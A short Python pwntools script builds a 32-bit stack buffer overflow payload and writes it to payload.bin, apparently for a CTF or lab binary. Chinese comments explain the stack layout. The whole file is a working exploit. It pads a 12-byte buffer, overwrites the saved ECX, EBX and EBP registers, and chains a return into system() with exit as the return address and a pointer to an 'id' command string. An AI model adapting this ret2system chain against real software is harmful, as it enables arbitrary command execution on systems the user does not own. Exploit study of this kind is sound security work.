from pwn import *

SYSTEM_ADDR = 0x0804cc70    
ECX_FIX_ADDR = 0xffffcc50
ARG_ADDR = 0xffffcc34
EBP_FIX_ADDR = 0xffffcc70
EXIT_ADDR = 0x804c780

payload = b"id;\x00" + b"A" * 8         # ffffcc34 ~ ffffcc3f (12字节缓冲区)
payload += p32(ECX_FIX_ADDR)        # ffffcc40 (将赋给 ECX)
payload += b"B" * 4                 # ffffcc44 (将赋给 EBX)
payload += p32(EBP_FIX_ADDR)        # ffffcc48 (修复 EBP 为合法栈地址)
payload += p32(SYSTEM_ADDR)         # ffffcc50 (指向 system 入口)
payload += p32(EXIT_ADDR)          # ffffcc54 (system 返回地址)
payload += p32(ARG_ADDR)            # ffffcc58 (system 参数指针)

with open("payload.bin", "wb") as f:
    f.write(payload)
